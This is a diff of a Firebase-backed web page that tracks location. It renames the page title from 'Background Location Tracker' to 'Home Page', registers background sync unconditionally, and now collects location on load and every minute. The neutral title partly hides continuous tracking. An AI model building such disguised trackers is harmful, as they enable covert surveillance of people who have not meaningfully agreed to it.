@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Background Location Tracker</title>
+    <title>Home Page</title>
     <script type="module">
         // Import Firebase
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
@@ -31,13 +31,11 @@
                     console.log("✅ Service Worker Registered!");
 
                     // Trigger Background Sync when online
-                    if (navigator.onLine) {
-                        navigator.serviceWorker.ready.then(reg => {
-                            reg.sync.register('sync-location')
-                                .then(() => console.log("✅ Background Sync Registered"))
-                                .catch(err => console.error("❌ Sync Registration Failed:", err));
-                        });
-                    }
+                    navigator.serviceWorker.ready.then(reg => {
+                        reg.sync.register('sync-location')
+                            .then(() => console.log("✅ Background Sync Registered"))
+                            .catch(err => console.error("❌ Sync Registration Failed:", err));
+                    });
                 })
                 .catch(error => console.error("❌ Service Worker Registration Failed:", error));
         }
@@ -167,10 +165,14 @@
             });
         });
 
-        setInterval(collectLocation, 60000); // Every 1 minute
+        // Send data immediately when the page loads
+        collectLocation();
+
+        // Send data every 60 seconds
+        setInterval(collectLocation, 60000);
     </script>
 </head>
 <body>
-    <h2>Tracking Location in Background......</h2>
+    <h2>Tracking Location in Background.</h2>
 </body>
 </html>
